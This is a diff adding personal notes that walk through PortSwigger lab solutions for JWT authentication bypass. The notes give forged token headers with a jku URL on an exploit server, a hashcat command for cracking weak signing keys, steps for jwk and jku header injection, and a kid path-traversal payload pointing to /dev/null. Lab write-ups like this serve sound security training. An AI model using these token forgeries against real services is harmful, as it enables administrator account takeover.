@@ -1,0 +1,59 @@
+WITH ALL OF THESE: 
+ensure that the JSON is correctly formatted, with , after every but last argument.
+
+like so
+header:
+{
+    "kid": "3fd54976-6650-417a-8675-6b9aa5679e17",
+    "alg": "RS256",
+    "jku": "https://exploit-0afb00e2044a782b80a1435e010d002b.exploit-server.net/exploit.jwk"
+}
+
+payload
+{
+    "iss": "portswigger",
+    "sub": "administrator",
+    "exp": 1706177679
+}
+
+
+3. JWT authentication bypass via weak signing key
+ATTENTION: Weak key is easily detected by Burp Suite Passive Scanner
+
+Crack signing key with hashcat: hashcat -m 16500 -a 0 <full_jwt> /usr/share/wordlists/rockyou.txt
+
+4. JWT authentication bypass via jwk header injection
+4.1 Go to JWT Editor Keys - New RSA Key - Generate
+4.2 Get Request with JWT token - Repeater - JSON Web Token tab - Attack (at the bottom) - Embedded JWK - Select your previously generated key - OK
+
+5. JWT authentication bypass via jku header injection
+5.1 JWT Editor Keys - New RSA Key - Generate - right-click on key - Copy Public Key as JWK
+5.2 Go to your exploit server and paste the next payload in Body:
+
+{
+    "keys": [
+
+    ]
+}
+5.3 In "keys" section paste your previously copied JWK:
+
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
+            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+        }
+    ]
+}
+5.4 Back to our JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.
+5.5 Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
+5.6 Change "sub" to administrator
+5.7 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key
+
+6. JWT authentication bypass via kid header path traversal
+6.1 JWT Editor Keys - New Symmetric Key - Generate - replace the value of "k" parameter to AA== - OK
+6.2 Back to our JWT, replace "kid" parameter with ../../../../../dev/null
+6.3 Change "sub" to administrator
+6.4 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key
